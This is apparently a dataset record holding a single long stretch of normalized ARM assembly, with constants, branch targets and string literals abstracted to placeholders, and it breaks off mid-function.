S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nCMN~R0,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLE~R4,R3\nORRGT~R4,R3,0\nCMP~R4,0\nBNE~FOO\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nBL~FOO\nMOV~R0,R4\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nSTR~R4,[SP,0]\nMOV~R0,R4\nMOV~R12,R3\nMOV~R5,0\nMOV~LR,0\nLDR~R1,[R12]\nMOV~R3,R0,LSL0\nMOV~R2,R0,LSL0\nADD~R3,R3,R2\nADD~R3,R3,R1\nSTR~R5,[R3,0]\nLDR~R2,[SP,0]\nLDR~R1,[R12]\nMOV~R3,R2,LSL0\nMOV~R2,R2,LSL0\nADD~R3,R3,R2\nADD~R3,R3,R1\nSTR~LR,[R3,0]\nLDR~R3,[SP,0]\nADD~R0,R3,0\nSTR~R0,[SP,0]\nCMP~R0,0\nBLE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nMOV~R4,R0\nLDR~R3,<STR>\nSTR~R0,[R3]\nCMN~R0,0\nMOVEQ~R0,R5\nBLEQ~FOO\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nORR~R2,R0,0\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nLDR~R4,<STR>\nLDR~R0,[R4]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nLDR~R0,[R4]\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R1,R0,LSR0\nSTR~R1,[SP,0]\nAND~R3,R1,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R0,LSR0\nCMP~R3,0\nBCC~FOO\nLDR~R2,<STR>\nADD~R11,R2,0\nLDRB~R3,[R2]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R2]\nLDRB~R3,[R2]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R2]\nMOV~R4,0\nSTRB~R4,[R2,0]\nMOV~R3,0\nSTRB~R3,[R2,0]\nBL~FOO\nLDR~R3,<STR>\nSTRB~R0,[R3,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R3,0]\nMOV~R3,0\nLDR~R1,<STR>\nSTRB~R3,[R1,0]\nMOV~R7,0\nSTRB~R7,[R1,0]\nSTRB~R4,[R11,0]\nSUB~R3,R3,0\nSTRB~R3,[R11,0]\nLDR~R2,[SP,0]\nSTRB~R2,[R1,0]\nMOV~R3,R2,ASR0\nSTRB~R3,[R11,0]\nLDRB~R3,[R11,0]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R11,0]\nBL~FOO\nSTRB~R0,[R11,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R11,0]\nLDRB~R3,[R11,0]\nORR~R3,R3,0\nSTRB~R3,[R11,0]\nLDR~R5,<STR>\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R6,<STR>\nMOV~R0,R5\nMOV~R1,R6\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R6\nMOV~R2,0\nBL~FOO\nLDR~R8,<STR>\nMOV~R0,R5\nMOV~R1,R8\nMOV~R2,R7\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R7,<STR>\nMOV~R0,R5\nMOV~R1,R7\nMOV~R2,0\nBL~FOO\nLDR~R10,<STR>\nMOV~R0,R5\nMOV~R1,R10\nMOV~R2,0\nBL~FOO\nLDR~R1,<STR>\nMOV~R0,R1\nMOV~R2,0\nBL~FOO\nLDR~R4,<STR>\nMOV~R0,R5\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nLDR~R9,<STR>\nMOV~R0,R6\nMOV~R1,R9\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R1,R0\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R4,<STR>\nMOV~R0,R5\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nMOV~R1,R9\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R1,<STR>\nMOV~R0,R1\nMOV~R2,0\nBL~FOO\nLDR~R1,<STR>\nMOV~R0,R1\nMOV~R2,0\nBL~FOO\nLDR~R4,<STR>\nMOV~R0,R4\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nMOV~R0,R4\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R4\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R1,R9\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R1,R0\nMOV~R2,0\nBL~FOO\nMOV~R0,R8\nMOV~R1,R8\nMOV~R2,0\nBL~FOO\nLDR~R1,<STR>\nMOV~R0,R1\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R4,<STR>\nMOV~R0,R5\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R5\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R10\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R7\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R4\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R1,<STR>\nMOV~R0,R1\nMOV~R2,0\nBL~FOO\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nMOV~R1,0\nSTR~R1,[SP,0]\nMOV~R2,0\nSTR~R2,[SP,0]\nLDR~R3,<STR>\nLDR~R5,[R3]\nCMP~R9,R5\nBEQ~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R6,[SP,0]\nMOV~R7,R3\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R4,R3,R6\nADD~R1,SP,0\nADD~R1,R1,0\nSTR~R7,[R1,R6]\nADD~R3,SP,0\nSTR~R7,[SP,0]\nADD~R3,R3,0\nSTR~R7,[R3]\nSTR~R7,[R3]\nBL~FOO\nLDR~R2,<STR>\nSTRB~R0,[R2,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R2,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R2,0]\nBL~FOO\nAND~R2,R0,0\nMOV~R3,R0,LSR0\nAND~R1,R3,0\nMOV~R3,R0,LSR0\nAND~R12,R3,0\nMOV~R0,R0,LSR0\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nCMP~R2,0\nBEQ~FOO\nSUB~R3,R2,0\nCMP~R2,0\nCMPNE~R3,0\nBLS~FOO\nCMP~R2,0\nBEQ~FOO\nCMP~R2,0\nCMPEQ~R1,0\nBEQ~FOO\nCMP~R2,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R1,0\nMOVLS~R3,0\nCMP~R3,0\nBEQ~FOO\nCMP~R1,0\nBLS~FOO\nCMP~R2,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R1,0\nMOVLS~R3,0\nCMP~R3,0\nBEQ~FOO\nCMP~R1,0\nBLS~FOO\nCMP~R2,0\nCMPEQ~R1,0\nBEQ~FOO\nCMP~R2,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R1,0\nMOVLS~R3,0\nCMP~R3,0\nBEQ~FOO\nCMP~R1,0\nBLS~FOO\nCMP~R2,0\nBHI~FOO\nSUB~R3,R2,0\nCMP~R2,0\nCMPNE~R3,0\nBLS~FOO\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nCMP~R2,0\nCMPNE~R2,0\nMOVNE~LR,0\nMOVEQ~LR,0\nBEQ~FOO\nMOV~R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nORR~R3,R3,R0\nORR~R3,R3,R12,LSL0\nAND~R2,R3,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R3,LSR0\nAND~R1,R3,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R1,LSL0\nORR~R2,R2,R3\nLDR~R3,<STR>\nSTR~R2,[R3,0]\nSTRB~LR,[R3,0]\nSTRB~LR,[R3,0]\nMOV~R0,R3\nMOV~R1,0\nBL~FOO\nLDR~R1,<STR>\nSTRB~R0,[R1,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R1,0]\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nMOVEQ~R3,0\nSTREQB~R3,[R11,0]\nADDEQ~R3,R3,0\nSTREQB~R3,[R11,0]\nSTRNEB~R7,[R11,0]\nMOVNE~R3,0\nSTRNEB~R3,[R11,0]\nLDR~R2,<STR>\nLDR~R3,[R2,0]\nSTR~R3,[R11,0]\nSTRB~R7,[R11,0]\nSTRB~R7,[R11,0]\nMOV~R0,R2\nMOV~R1,R11\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTRB~R0,[R11,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R11,0]\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R7,[SP,0]\nLDR~R1,<STR>\nLDR~R3,[R1,0]\nSTR~R3,[SP,0]\nLDR~R3,[R11]\nMOV~R3,R3,LSR0\nSTRB~R3,[SP,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[SP,0]\nLDR~R3,<STR>\nLDR~R0,[R3]\nSTR~R4,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nCMP~R3,0\nBLE~FOO\nMOV~R9,R5\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R4,0\nMOV~R5,R4\nADD~R2,SP,0\nADD~R2,R2,0\nLDR~R3,[SP,0]\nADD~R6,R2,R3\nADD~R7,SP,0\nLDR~R1,[SP,0]\nSTR~R5,[R1]\nLDR~R3,<STR>\nLDR~R0,[R3]\nSTR~R5,[SP]\nSTR~R5,[SP,0]\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nBLE~FOO\nLDR~R2,[SP,0]\nLDR~R3,[R2]\nCMP~R3,0\nBEQ~FOO\nCMP~R0,0\nBLS~FOO\nMOV~R0,R6\nLDR~R3,<STR>\nLDR~R2,[R3]\nLDR~R3,[SP,0]\nCMP~R3,R2\nBNE~FOO\nLDRB~R3,[SP,0]\nCMP~R3,0\nBNE~FOO\nMOV~R12,R7\nLDRB~R2,[SP,0]\nLDRB~R3,[SP,0]\nORR~R2,R2,R3,LSL0\nCMP~R2,0\nBEQ~FOO\nMOV~R3,0\nCMP~R2,R3\nBNE~FOO\nLDRB~R3,[R12,0]\nLDRB~R2,[R12,0]\nORR~R3,R3,R2,LSL0\nLDR~R1,[SP,0]\nCMP~R3,R1\nBNE~FOO\nLDRB~R3,[R12,0]\nTST~R3,0\nBEQ~FOO\nTST~R3,0\nBEQ~FOO\nTST~R3,0\nBNE~FOO\nTST~R3,0\nBNE~FOO\nLDR~R2,[R12,0]\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSUB~R3,R3,0\nAND~R2,R3,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R3,LSR0\nAND~R1,R3,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R1,LSL0\nORR~LR,R2,R3\nLDR~R3,[R0,0]\nCMP~LR,R3\nBNE~FOO\nCMP~R4,0\nBGT~FOO\nLDR~R3,<STR>\nLDR~R1,[R3]\nMOV~R3,R4,LSL0\nMOV~R2,R4,LSL0\nADD~R3,R3,R2\nADD~R0,R1,R3\nLDR~R3,[R0,0]\nCMP~R3,0\nADDNE~R1,R0,0\nMOVNE~R2,R4\nBNE~FOO\nB~FOO\nMOV~R0,R1\nLDR~R3,[R1,0]\nADD~R1,R1,0\nCMP~R3,0\nBEQ~FOO\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nB~FOO\nMOV~R4,R2\nCMP~R0,0\nBEQ~FOO\nSTR~LR,[R0,0]\nLDR~R3,[R12]\nSTRB~R3,[R0,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nBL~FOO\nB~FOO\nMOV~R3,0\nADD~R1,SP,0\nMOV~R2,R3\nSTR~R2,[R3,R1]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nMOV~R3,R2\nADD~R2,SP,0\nMOV~R0,0\nSTR~R0,[R3,R2]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nSTR~R0,[SP,0]\nMOV~R6,R0\nMOV~R5,R0\nMOV~R3,R0\nMOV~R7,0\nMOV~R2,R3,LSL0\nMOV~R3,R3,LSL0\nADD~R2,R2,R3\nLDR~R3,<STR>\nLDR~R3,[R3]\nADD~R4,R2,R3\nLDR~R0,[R4,0]\nCMP~R0,0\nMOVHI~R1,0\nBHI~FOO\nCMP~R0,0\nBEQ~FOO\nMOV~R1,0\nLDR~R3,<STR>\nLDR~R3,[R3]\nLDR~R2,[R4,0]\nRSB~R3,R2,R3\nCMP~R3,R1\nBLS~FOO\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nLDR~R3,[R4,0]\nCMP~R3,0\nSTRLSB~R7,[R4,0]\nSTRLS~R7,[R4,0]\nBLS~FOO\nLDRB~R3,[R4,0]\nADD~R3,R3,0\nAND~R3,R3,0\nSTRB~R3,[R4,0]\nCMP~R3,0\nSTREQB~R7,[R4,0]\nSTREQ~R7,[R4,0]\nBEQ~FOO\nMOV~R0,R4\nBL~FOO\nB~FOO\nCMP~R0,0\nBNE~FOO\nLDR~R1,[R4,0]\nMOV~R2,R1,LSR0\nMOV~R2,R2,LSL0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,R2,R3\nAND~R1,R1,0\nLDR~R3,[R2,-0]\nORR~R3,R3,R0,LSLR1\nSTR~R3,[R2,-0]\nLDR~R0,[R4,0]\nCMP~R5,R0\nMOVLT~R5,R0\nB~FOO\nCMP~R0,0\nBEQ~FOO\nLDR~R0,[R4,0]\nMOV~R2,R0,LSR0\nMOV~R2,R2,LSL0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R2,R2,R1\nAND~R0,R0,0\nLDR~R3,[R2,-0]\nMOV~R1,0\nORR~R3,R3,R1,LSLR0\nSTR~R3,[R2,-0]\nLDR~R3,[R4,0]\nCMP~R6,R3\nMOVLT~R6,R3\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nCMP~R3,0\nBLE~FOO\nMOV~R4,0\nSTR~R4,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nCMP~R6,R5\nMOVGE~R0,R6\nMOVLT~R0,R5\nADD~R3,SP,0\nSTR~R3,[SP]\nADD~R0,R0,0\nADD~R1,SP,0\nADD~R2,SP,0\nMOV~R3,R4\nBL~FOO\nMOV~R0,R4\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nSTR~R4,[SP,0]\nLDR~R2,[SP,0]\nSTR~R2,[SP,0]\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R3,R3,R2\nSTR~R3,[SP,0]\nMOV~R2,R4,LSL0\nMOV~R3,R4,LSL0\nADD~R2,R2,R3\nLDR~R3,<STR>\nLDR~R3,[R3]\nADD~R4,R2,R3\nLDR~R2,[R4,0]\nCMN~R2,0\nBEQ~FOO\nMOV~R3,R2,LSR0\nMOV~R3,R3,LSL0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R3,R1\nAND~R2,R2,0\nLDR~R3,[R3,-0]\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nMOV~R2,0\nSTR~R2,[SP,0]\nADD~R2,R2,0\nSTR~R2,[SP,0]\nLDR~R0,[R4,0]\nADD~R3,SP,0\nADD~R3,R3,0\nSTR~R3,[SP]\nMOV~R1,0\nADD~R3,SP,0\nADD~R3,R3,0\nBL~FOO\nLDR~R3,[SP,0]\nORRS~R6,R0,R3\nBNE~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nBL~FOO\nLDR~R3,<STR>\nLDRB~R2,[R3]\nLDRB~R1,[R3,0]\nORR~R1,R2,R1,LSL0\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R5,R0,LSR0\nLDR~R3,<STR>\nLDR~LR,[R3]\nCMP~LR,0\nBLE~FOO\nLDR~R3,<STR>\nLDR~R12,[R3]\nMOV~R0,R6\nMOV~R1,R12\nLDRB~R3,[R12,0]\nLDRB~R2,[R12,0]\nORR~R3,R3,R2,LSL0\nCMP~R3,R5\nBHI~FOO\nLDRB~R3,[R12,0]\nLDRB~R2,[R12,0]\nORR~R3,R3,R2,LSL0\nCMP~R3,R5\nBHI~FOO\nADD~R0,R0,0\nADD~R12,R12,0\nCMP~LR,R0\nBNE~FOO\nMOV~R1,0\nSTR~R1,[R4]\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nMOV~R1,0\nSTRB~R1,[R4,0]\nMOV~R2,0\nSTR~R2,[R4,0]\nB~FOO\nLDR~R2,[R4,0]\nMOV~R3,R2,LSR0\nMOV~R3,R3,LSL0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R3,R1\nAND~R2,R2,0\nLDR~R3,[R3,-0]\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nLDR~R3,[R4,0]\nCMP~R3,0\nBEQ~FOO\nLDR~R3,[R4,0]\nCMP~R3,0\nBNE~FOO\nADD~R0,R4,0\nADD~R1,R4,0\nMOV~R2,0\nBL~FOO\nLDR~R3,[R4,0]\nSUB~R3,R3,0\nSTR~R3,[R4,0]\nMOV~R3,0\nLDR~R2,[SP,0]\nSTR~R3,[R2]\nADD~R10,R4,0\nLDR~R2,[R4,0]\nLDR~R0,[R4,0]\nADD~R1,R10,R2\nRSB~R2,R2,0\nADD~R3,R3,0\nBL~FOO\nCMP~R0,0\nMOVEQ~R3,0\nLDREQ~R1,[SP,0]\nSTREQ~R3,[R1]\nBEQ~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R2,[SP,0]\nLDR~R3,[R2]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R4,0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nLDRB~R3,[R4,0]\nADD~R3,R3,0\nAND~R3,R3,0\nSTRB~R3,[R4,0]\nCMP~R3,0\nMOVHI~R3,0\nSTRHIB~R3,[R4,0]\nMOVHI~R1,0\nSTRHI~R1,[R4,0]\nBHI~FOO\nMOV~R0,R4\nBL~FOO\nB~FOO\nLDR~R3,[R4,0]\nADD~R3,R3,R0\nSTR~R3,[R4,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R4,0]\nLDR~R3,[R4,0]\nSUB~R3,R3,0\nCMP~R3,0\nLDRLS~PC,[PC,R3,LSL0]\nB~FOO\nADD~R5,R4,0\nMOV~R7,0\nB~FOO\nLDRB~R3,[R5]\nCMP~R3,0\nBNE~FOO\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nLDRB~R3,[R5,0]\nCMP~R3,0\nADDEQ~R5,R5,0\nADDEQ~R7,R7,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nADD~R8,SP,0\nMOV~R0,R8\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nLDR~R6,[SP,0]\nMOV~R0,R6\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nLDRB~R3,[R5,0]\nCMP~R3,0\nBNE~FOO\nADD~R5,R5,0\nADD~R7,R7,0\nLDR~R0,[R4,0]\nMOV~R1,R8\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nB~FOO\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nBL~FOO\nCMP~R0,0\nBNE~FOO\nB~FOO\nLDRB~R3,[R2,R5]\nCMP~R3,0\nMOVEQ~R3,0\nSTREQB~R3,[R2,R5]\nBEQ~FOO\nCMP~R3,0\nSUBEQ~R3,R3,0\nSTREQB~R3,[R2,R5]\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nLDR~R0,[R4,0]\nMOV~R1,R5\nMOV~R3,0\nBL~FOO\nADD~R5,R5,0\nADD~R7,R7,0\nLDR~R3,[R4,0]\nCMP~R7,R3\nBLT~FOO\nCMP~R7,0\nMOVGT~R3,0\nSTRGT~R3,[R4,0]\nBGT~FOO\nB~FOO\nLDR~R1,[R4,0]\nSUB~R0,R1,0\nCMP~R0,0\nBLE~FOO\nADD~R3,R0,R4\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nB~FOO\nADD~R3,R0,R4\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nADD~R7,R0,0\nCMN~R7,0\nBNE~FOO\nB~FOO\nSUBS~R0,R0,0\nBNE~FOO\nMOV~R0,R10\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nMOV~R7,R0\nCMN~R0,0\nBNE~FOO\nMOV~R0,R10\nLDR~R1,[R4,0]\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nMOV~R7,R0\nCMN~R0,0\nBEQ~FOO\nCMP~R7,0\nBLE~FOO\nLDR~R3,[R4]\nLDR~R0,[R4,0]\nLDR~R1,[R3]\nLDRB~R2,[R3,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nLDR~R1,[R4,0]\nSUB~R0,R1,0\nCMP~R0,0\nBLE~FOO\nADD~R3,R0,R4\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nB~FOO\nADD~R3,R0,R4\nLDRB~R3,[R3,0]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nCMP~R3,0\nBEQ~FOO\nCMP~R3,0\nBNE~FOO\nADD~R7,R0,0\nCMN~R7,0\nBNE~FOO\nB~FOO\nSUBS~R0,R0,0\nBNE~FOO\nMOV~R0,R10\nLDR~R2,<STR>\nMOV~R3,0\nBL~FOO\nMOV~R7,R0\nCMN~R0,0\nBEQ~FOO\nCMP~R7,0\nBLE~FOO\nLDR~R3,[R4]\nLDR~R0,[R4,0]\nLDR~R1,[R3,0]\nLDRB~R2,[R3,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R7,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R1,R0\nLDR~R0,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R7,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R1,R0\nLDR~R0,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R7,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R1,R0\nLDR~R0,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R7,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R1,R0\nLDR~R0,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nMOV~R0,R4\nBL~FOO\nSUBS~R7,R0,0\nBLE~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R1,R0\nLDR~R0,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,0\nBL~FOO\nLDR~R0,[R4,0]\nLDR~R1,<STR>\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R3,0\nSTR~R3,[R4,0]\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nADD~R1,R1,0\nBL~FOO\nMOV~R2,R0\